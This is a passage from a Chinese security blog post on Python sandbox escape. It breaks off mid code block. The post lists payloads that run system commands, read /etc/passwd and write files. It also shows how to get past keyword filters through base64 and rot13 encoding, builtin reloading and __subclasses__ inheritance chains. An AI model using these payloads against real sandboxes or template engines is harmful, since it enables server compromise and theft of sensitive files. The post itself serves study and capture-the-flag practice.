<p>[<a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/]" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/]</a>(</p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/" data-id="ckabsu38j001ykkvr2mk875vn" class="article-share-link" data-share="baidu" data-title="SSTI模板注入-Jinja2">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-Python沙箱逃逸" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" class="article-date">
  <time datetime="2019-07-06T08:24:03.000Z" itemprop="datePublished">2019-07-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">Python沙箱逃逸</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本来计划两天内出完这篇<code>Blog</code>的，结果被<code>mfc</code>小学期以及想玩的心态拖着.(拖到了6天),接下来要加把劲啊！</p>
<h3 id="python沙箱逃逸介绍"><a href="#python沙箱逃逸介绍" class="headerlink" title="python沙箱逃逸介绍"></a>python沙箱逃逸介绍</h3><p><code>python</code>沙箱逃逸用于一些沙箱环境(如被禁止掉关键系统函数的<code>python</code>环境)，如一些<code>OJ</code>网站或者<code>jinja2</code>这类模板解释器。而沙箱逃逸的目的则是绕过对关键系统函数的限制，在对方服务器上运行我们的恶意代码，甚至<code>getshell</code>。</p>
<h3 id="Python中可执行代码命令的模板以及函数"><a href="#Python中可执行代码命令的模板以及函数" class="headerlink" title="Python中可执行代码命令的模板以及函数"></a>Python中可执行代码命令的模板以及函数</h3><ul>
<li><code>os</code>模块</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>exec</code>代码执行</li>
</ul>
<p><code>exec(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)</code></p>
<ul>
<li><code>eval</code>代码执行</li>
</ul>
<p><code>eval(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;)</code></p>
<ul>
<li>利用<code>timeit</code>模块与<code>timeit</code>函数</li>
</ul>
<p><code>timeit</code>函数介绍:计算一小段<code>python</code>代码的执行时间。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line"></span><br><span class="line">timeit.timeit(<span class="string">"__import__('os').system('ls')"</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>platform</code>模块</li>
</ul>
<p><code>platform</code>模板可以提供很多方法去获取目标系统的操作信息，如<code>platform.system</code>等函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line">platform.popen(<span class="string">'whoami'</span>).read()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>commands</code>模块</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line">commands.getoutput(<span class="string">'whoami'</span>)</span><br><span class="line"></span><br><span class="line">commands.getstatusoutpur(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>subprocess</code>模块</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">subprocess.call([<span class="string">'whoami'</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>通过<code>types</code>模块和<code>FileType</code>函数进行文件读取</li>
</ul>
<p><code>types</code>模块定义了<code>python</code>的很多类型，其中<code>FileType</code>函数可以用来打开文件进行文件读取.</p>
<p><img src="https://s2.ax1x.com/2019/07/05/ZajKEQ.png" alt="ZajKEQ.png"></p>
<ul>
<li>其他文件读取操作</li>
</ul>
<p><code>file(&#39;xxx.txt&#39;).read()</code></p>
<p><code>open(&#39;xxx.txt&#39;).read()</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">codecs.open(<span class="string">'xxx.txt'</span>).read()</span><br></pre></td></tr></table></figure>

<ul>
<li><code>f修饰符</code>进行命令执行</li>
</ul>
<p>此命令执行方法只限于<code>python3.6</code>以上的版本</p>
<p>用法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">f'<span class="subst">&#123;__import__(<span class="string">"os"</span>).system(<span class="string">"dir"</span>)&#125;</span>'</span></span><br><span class="line"></span><br><span class="line"><span class="string">f'<span class="subst">&#123;open(<span class="string">'xxx.txt'</span>).read()&#125;</span>'</span></span><br></pre></td></tr></table></figure>

<ul>
<li>动态加载类和函数</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="花式命令执行绕过逃逸"><a href="#花式命令执行绕过逃逸" class="headerlink" title="花式命令执行绕过逃逸"></a>花式命令执行绕过逃逸</h3><h4 id="dict-与dir-函数"><a href="#dict-与dir-函数" class="headerlink" title="__dict__与dir()函数"></a><code>__dict__</code>与<code>dir()</code>函数</h4><h5 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir()函数"></a><code>dir()</code>函数</h5><p><img src="https://s2.ax1x.com/2019/07/05/Zdinbt.png" alt="Zdinbt.png"></p>
<p>先看一下简单的介绍，简单来讲<code>dir()</code>函数就是：<strong>无参数时，返回当前范围内的变量，方法等，有参数时，返回参数的属性方法等</strong></p>
<p>通过<code>dir(__builtins__)</code>可以查看所有内置函数以及私有属性,不过在<code>python3</code>中<code>builtins</code>是一个模块，需要先进行<code>import</code>再进行<code>dir</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#39;ArithmeticError&#39;, &#39;AssertionError&#39;, &#39;AttributeError&#39;, &#39;BaseException&#39;, &#39;BufferError&#39;, &#39;BytesWarning&#39;, &#39;DeprecationWarning&#39;, &#39;EOFError&#39;, &#39;Ellipsis&#39;, &#39;EnvironmentError&#39;, &#39;Exception&#39;, &#39;False&#39;, &#39;FloatingPointError&#39;, &#39;FutureWarning&#39;, &#39;GeneratorExit&#39;, &#39;IOError&#39;, &#39;ImportError&#39;, &#39;ImportWarning&#39;, &#39;IndentationError&#39;, &#39;IndexError&#39;, &#39;KeyError&#39;, &#39;KeyboardInterrupt&#39;, &#39;LookupError&#39;, &#39;MemoryError&#39;, -ge&#39;, &#39;raw_input&#39;, &#39;reduce&#39;, &#39;reload&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;unichr&#39;, &#39;unicode&#39;, &#39;vars&#39;, &#39;xrange&#39;, &#39;zip&#39;]</span><br></pre></td></tr></table></figure>

<p>可以看出平时我们所有的<code>chr,open</code>等函数其实就是</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">__builtin__.open()</span><br><span class="line"></span><br><span class="line">__builtin__.chr()</span><br></pre></td></tr></table></figure>

<p>我们还可以通过<code>open</code>函数进行敏感文件读取</p>
<p><code>__builtins__.open(&#39;/etc/passwd&#39;).read()</code></p>
<h5 id="dict-方法"><a href="#dict-方法" class="headerlink" title="__dict__方法"></a><code>__dict__</code>方法</h5><p><code>dict</code>与<code>dir()</code>都是都是列出一个<strong>模板/类/对象</strong>下面所有的<strong>属性和函数</strong>，下面两句是等价的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> __builtins__.__dict__[<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'whoami'</span>)</span><br><span class="line"></span><br><span class="line">__builtins__.__import__(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>不过..这有什么用呢(<strong>当然是回到最初的起点考虑—–&gt;绕过</strong>),通过<code>__dict__</code>,即便过滤了<code>import</code>，我们完全可以通过<code>base64</code>编码加<code>__dict__</code>进行一波绕过</p>
<p><code>payload</code>如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="importlib动态导入模块命令执行"><a href="#importlib动态导入模块命令执行" class="headerlink" title="importlib动态导入模块命令执行"></a><code>importlib</code>动态导入模块命令执行</h4><h5 id="无绕过payload"><a href="#无绕过payload" class="headerlink" title="无绕过payload"></a>无绕过payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="绕过payload"><a href="#绕过payload" class="headerlink" title="绕过payload"></a>绕过payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"></span><br><span class="line">importlib.import_module(<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="getattr-和-getattribute"><a href="#getattr-和-getattribute" class="headerlink" title="__getattr__和__getattribute__"></a><strong><code>__getattr__</code></strong>和<code>__getattribute__</code></h4><p>其实这里最常用的是<code>__getattribute__</code>，当我们构造的如下继承链(后面会说明)，遭到了关键性名词的过滤，如下面的例子：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">"linecache"</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>如果这里过滤了<code>ls</code>命令,那么<code>func_globals</code>以及<code>__globals__</code>都无法使用，我们就可以使用<code>__getattribute__</code>进行绕过，两个魔法函数用法定义如下：</p>
<ol>
<li>如果在类中定义了<code>__getattr__()</code>这个方法，那么在对象查询属性时,如果这个属性在类中定义了，如一个已经实例化的对象x定义了属性name，那么在使用x.name时就不会调用<code>__getattr__(</code>name<code>)</code>；会直接返回name已经定义好的值。简单的说：<code>__getattr__()</code>会在对象中不存在这个属性时被调用。</li>
<li>如果在类定义了<code>__getattribute__()</code>方法，那么它无条件被调用。当实例化的对象每次引用属性和方法时都会先调用它。如果属性查找不到那么就会引发<code>AttributeError</code>的异常。除非在类中同时定义了<code>__getattribute__()</code>和<code>__getattr__()</code>两个方法。</li>
</ol>
<p>所以最终的绕过payload为:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">"linecache"</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'system'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br></pre></td></tr></table></figure>

<p>利用调用属性<code>func_globals</code>(其实就是<code>__globals__</code>)(<strong>利用func_globals可以返回对应类的所有调用基类与函数</strong>)，最终绕过过滤。</p>
<p>其实<code>__getattribute__</code>与<code>__getattr__</code>不仅只支持对象，<code>module</code>也是支持的，这是郁师傅文章中的两个例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">"flfgrz"</span>.encode(<span class="string">"rot13"</span>))(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">"metsys"</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">"os"</span>).__getattribute__(<span class="string">"metsys"</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">"os"</span>).__getattribute__(<span class="string">"flfgrz"</span>.encode(<span class="string">"rot13"</span>))(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<p>虽然<code>__import__(&#39;os&#39;)__</code>是一个模板，<strong>但是也可以通过<code>__getattribute__</code>去调用属性，判断我们的属性是否存在，这里我们调用其实是<code>system</code>，所以属性存在，直接返回原来的属性system，完成系统命令执行。</strong></p>
<h4 id="花式重载以及引入"><a href="#花式重载以及引入" class="headerlink" title="花式重载以及引入"></a>花式重载以及引入</h4><h5 id="引入模块路径"><a href="#引入模块路径" class="headerlink" title="引入模块路径"></a>引入模块路径</h5><p>当一个沙箱环境中缺少了<code>os</code>等模块，如通过代码<code>sys.modules[&#39;os&#39;]=None</code>将<code>os</code>模块限制，但是我们还可以通过路径引入，在<code>linux</code>环境下，os模块的默认路径为<strong>usr/lib/python2.7/os.py</strong>,我们可以再次通过引入<code>os</code>模块路径，再次进行命令执行。代码测试如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">'os'</span>]=<span class="literal">None</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: No module named os</span><br><span class="line">sys.modules[<span class="string">'os'</span>]=<span class="string">'/usr/lib/python2.7/os.py'</span></span><br><span class="line"><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure>

<p>成功在os模块被限制的情况下成功进行了引入。</p>
<h5 id="reload方法进行重载"><a href="#reload方法进行重载" class="headerlink" title="reload方法进行重载"></a>reload方法进行重载</h5><p>在python中，不用引入直接使用的内置函数为<code>builtin</code>函数，随着<code>__builtins__</code>模板自动引入当前华，在前面我们也说过<code>chr()</code>函数其实相当于<code>__builtin__.chr()</code>,但是如果我们把这些函数从<code>__builtin__</code>中删除，就再也无法调用这些函数了。如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">del</span> __builtins__.chr</span><br><span class="line">chr(<span class="number">97</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'chr'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"> reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line"><span class="string">'a'</span></span><br></pre></td></tr></table></figure>

<p>同样，如果在<code>__builtins__</code>删除掉了<code>__import__</code>,<code>eval</code>,<code>execfile</code>等函数，那么我们就无法进行危险函数调用了，所以这里可以通过<code>reload</code>再次将所有危险方法重载一次。<strong>但是reload也是<code>__builtin__</code>下面的函数，如果将reload过滤掉，我们就没法重载了，但是,python中还有一个模块叫做<code>imp</code>,是一个与引入相关的模块，通过如下代码，我们可以再次引入。</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">del</span> __builtins__.chr</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">'chr'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"> <span class="keyword">import</span> imp</span><br><span class="line"> imp.reload(__builtins__)</span><br><span class="line">&lt;module <span class="string">'__builtin__'</span> (built-<span class="keyword">in</span>)&gt;</span><br><span class="line"> chr(<span class="number">97</span>)</span><br><span class="line"><span class="string">'a'</span></span><br></pre></td></tr></table></figure>

<p>同样在没过滤<code>execfile</code>函数的情况下，还可以通过<code>execfile</code>进行加载模板文件.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>)</span><br><span class="line"></span><br><span class="line">system(<span class="string">'whoami'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="引入objecb命令执行"><a href="#引入objecb命令执行" class="headerlink" title="引入objecb命令执行"></a>引入objecb命令执行</h4><p>这里自己踩了几个定义不清晰的坑点，也来说一下。</p>
<p><code>python</code>的<code>object</code>类中集成了很多基础函数，在我们想调用这些函数也是通过调用<code>object</code>去操作的,而<code>object类</code>主要通过<code>__mro__</code>和<code>__bases__</code>两种方式来创建，如下是创建方法</p>
<p>首先大概看一下这个两个<code>tuple</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__</span><br><span class="line">(&lt;type <span class="string">'tuple'</span>&gt;, &lt;type <span class="string">'object'</span>&gt;)</span><br><span class="line">().__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure>

<p>所以创建一个<code>object</code>大概有如下几种方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>这里再来介绍一下常见的一些属性，可以更好的理解构造的<strong>命令执行继承链条</strong></p>
<h5 id="bases-属性"><a href="#bases-属性" class="headerlink" title="__bases__属性"></a><code>__bases__</code>属性</h5><p>返回一个类所继承的类，返回的是元组形式。`</p>
<h5 id="class-返回一个实例所属的类"><a href="#class-返回一个实例所属的类" class="headerlink" title="__class__返回一个实例所属的类"></a><code>__class__</code>返回一个实例所属的类</h5><p>返回一个实例所属的类</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lihuaiqiu</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">huai=lihuaiqiu()</span><br><span class="line"><span class="keyword">print</span> huai.__class__</span><br></pre></td></tr></table></figure>

<p>最终返回</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__main__.lihuaiqiu</span><br><span class="line">[Finished <span class="keyword">in</span> <span class="number">0.3</span>s]</span><br></pre></td></tr></table></figure>

<h5 id="globals-属性"><a href="#globals-属性" class="headerlink" title="__globals__属性"></a><code>__globals__</code>属性</h5><p>只读，以字典的形式返回函数所在的全局命名空间所定义的全局变量。如：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__</span><br></pre></td></tr></table></figure>

<p>功能等同于<code>func_globals</code>，如下两个<code>payload</code>等价</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'__global'</span>+<span class="string">'s__'</span>)[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="subclasses-属性"><a href="#subclasses-属性" class="headerlink" title="__subclasses__属性"></a><code>__subclasses__</code>属性</h5><p>以dict形式返回当前类的所有子类。</p>
<h5 id="构造继承链绕过沙箱"><a href="#构造继承链绕过沙箱" class="headerlink" title="构造继承链绕过沙箱"></a>构造继承链绕过沙箱</h5><p>首先起手式肯定是先去构造<code>object</code>类，这个在前面写了几种构造方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>通过<code>payload:().__class__.__base__.__subclasses__()</code>等列出所有子类，在所有子类中寻找可以进一步利用的危险操作。</p>
<p><img src="https://s2.ax1x.com/2019/07/06/Zw8qtU.png" alt="Zw8qtU.png"></p>
<p>在这里可以看到<code>&lt;type &#39;file&#39;&gt;</code>这个<code>file</code>对象，进一步通过<code>dir()</code>函数查看有没有什么可以利用的危险函数方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, _<span class="string">', '</span>__init__<span class="string">', '</span>__iter__<span class="string">', '</span>__new__<span class="string">', '</span>__reduce__<span class="string">', '</span>__reduce_ex__<span class="string">', '</span>__repr__<span class="string">', '</span>__setattr__<span class="string">', '</span>__<span class="string">', '</span>__str__<span class="string">', '</span>__subclasshook__<span class="string">', '</span>close<span class="string">', '</span>closed<span class="string">', '</span>encoding<span class="string">', '</span>errors<span class="string">', '</span>fileno<span class="string">', '</span>flush<span class="string">', '</span>isaode<span class="string">', '</span>name<span class="string">', '</span>newlines<span class="string">', '</span>next<span class="string">', '</span>read<span class="string">', '</span>readinto<span class="string">', '</span>readline<span class="string">', '</span>readlines<span class="string">', '</span>seek<span class="string">', '</span>softspace<span class="string">', '</span>truncate<span class="string">', '</span>write<span class="string">', '</span>writelines<span class="string">', '</span>xreadlines<span class="string">']</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到是有<code>文件读写函数</code>的，所以可以通过<code>().__class__.__base__.__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code>这样的payload进行读取敏感文件数据等价于<code>file(&#39;/etc/passwd&#39;).read()</code></p>
<p>那么通过这个思路:先找到<code>object</code>的所有子类，再去找有危险操作的子类,这里的子类中是有两种类型的<code>type</code>与<code>class</code>，<code>class</code>最好配置<code>__init__</code>初始化再进行<code>__globals__</code>更好的寻找危险利用点。这里总结一下常用的<code>payload</code>。</p>
<h5 id="读文件-写文件"><a href="#读文件-写文件" class="headerlink" title="读文件/写文件"></a>读文件/写文件</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read() </span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/flag'</span>, <span class="string">'w'</span>).write(<span class="string">'flag&#123;sandbox_is_so_cool&#125;'</span>)</span><br></pre></td></tr></table></figure>

<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"><span class="comment">#也是载入__builtins__</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span 